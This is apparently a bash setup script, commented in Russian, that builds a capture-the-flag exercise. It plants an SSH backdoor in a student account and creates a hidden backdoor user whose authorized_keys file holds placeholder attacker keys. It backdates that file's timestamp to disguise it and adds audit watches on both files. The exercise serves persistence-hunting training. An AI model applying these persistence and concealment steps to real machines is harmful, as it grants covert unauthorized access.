#!/bin/bash

echo "🔧 Подготовка CTF-среды..."

# Очистка старого пользователя
sudo userdel -r backdooruser 2>/dev/null

# Явный бэкдор
mkdir -p /home/student/.ssh
chmod 700 /home/student/.ssh
echo "ssh-rsa AAAAB3NzaFakeStudentKey attacker1@evilhost" >> /home/student/.ssh/authorized_keys
chmod 600 /home/student/.ssh/authorized_keys

# Скрытый бэкдор
sudo adduser --disabled-password --gecos "" backdooruser
sudo mkdir -p /home/backdooruser/.ssh
sudo chmod 700 /home/backdooruser/.ssh
echo "ssh-rsa AAAAB3NzaC1yc2EBACKDOORfake attacker2@evilhost" | sudo tee -a /home/backdooruser/.ssh/authorized_keys
sudo chmod 600 /home/backdooruser/.ssh/authorized_keys
sudo chown -R backdooruser:backdooruser /home/backdooruser/.ssh
sudo touch -t 202101010101 /home/backdooruser/.ssh/authorized_keys

# Аудит
sudo auditctl -w /home/student/.ssh/authorized_keys -p wa -k student_key_watch
sudo auditctl -w /home/backdooruser/.ssh/authorized_keys -p wa -k backdoor_key_watch

echo "✅ Готово. Среда развернута."
